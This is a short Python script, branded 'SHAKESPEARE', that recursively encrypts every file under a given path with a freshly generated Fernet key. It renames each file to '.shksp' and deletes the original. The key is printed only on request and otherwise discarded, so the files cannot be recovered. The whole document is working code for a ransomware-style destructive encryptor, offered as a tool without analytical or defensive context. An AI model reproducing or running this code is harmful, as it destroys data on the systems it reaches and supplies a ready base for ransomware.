from cryptography.fernet import Fernet
import os
import sys

key = Fernet.generate_key()
f = Fernet(key)

pathencrypt = input("Path to encrypt: ").strip()

if not os.path.exists(pathencrypt):
    print("[SHAKESPEARE] Invalid Path")
    sys.exit()

def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as file:
            content = file.read()

        encrypted = f.encrypt(content)
        new_path = os.path.splitext(filepath)[0] + ".shksp"

        with open(new_path, "wb") as new_file:
            new_file.write(encrypted)

        os.remove(filepath)
        print(f"[SHAKESPEARE] Encrypted: {filepath}")
    except Exception as e:
        print(f"[SHAKESPEARE] Error {filepath}: {e}")

if os.path.isfile(pathencrypt):
    encrypt_file(pathencrypt)
elif os.path.isdir(pathencrypt):
    for root, dirs, files in os.walk(pathencrypt):
        for file in files:
            full_path = os.path.join(root, file)
            if not full_path.endswith(".shksp"):
                encrypt_file(full_path)
else:
    print("[SHAKESPEARE] Invalid Path")
    sys.exit()

showkey = input("Do you want to print the key? (yes/no): ").strip().lower()
if showkey == "yes":
    print("\nEncryption Key:", key.decode())
else:
    sys.exit()



print('made by ctpt01')